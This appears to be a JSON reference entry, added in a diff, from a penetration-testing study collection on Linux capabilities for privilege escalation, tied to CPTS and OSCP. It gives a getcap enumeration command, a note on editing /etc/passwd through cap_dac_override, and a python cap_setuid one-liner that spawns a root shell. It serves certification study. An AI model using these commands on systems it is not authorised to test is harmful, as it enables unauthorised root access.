@@ -1,0 +1,68 @@
+{
+  "type": "reference",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "getcap"
+  ],
+  "tags": [
+    "reference",
+    "capabilities"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Reference",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Enumerate capabilities across the filesystem",
+      "command": "getcap -r / 2>/dev/null"
+    },
+    {
+      "label": "cap_dac_override -> bypass file perms (edit /etc/passwd)",
+      "command": "getcap /usr/bin/vim.basic"
+    },
+    {
+      "label": "cap_setuid on python -> instant root",
+      "command": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
+    }
+  ],
+  "notes": "Flags:\n =    clear capability, no privileges\n +ep  effective + permitted\n +ei  effective + inheritable\n +p   permitted only\nHigh-value:\n cap_setuid        set effective UID (root)\n cap_setgid        set effective GID (root)\n cap_sys_admin     broad admin privileges\n cap_dac_override  bypass file r/w/x permission checks",
+  "references": [
+    {
+      "title": "capabilities(7)",
+      "url": "https://man7.org/linux/man-pages/man7/capabilities.7.html"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "capabilities",
+      "note": "Full enumerate-and-abuse workflow.",
+      "rel": "next"
+    }
+  ],
+  "id": "ref-capabilities",
+  "name": "Reference - Linux Capabilities for Escalation",
+  "command": "getcap -r / 2>/dev/null   # then match against this list",
+  "description": "Capability flag meanings and the high-value capabilities that lead to privilege escalation.",
+  "opsec": "silent",
+  "mitre": [
+    "T1548.001"
+  ],
+  "exam": "exam-ok"
+}
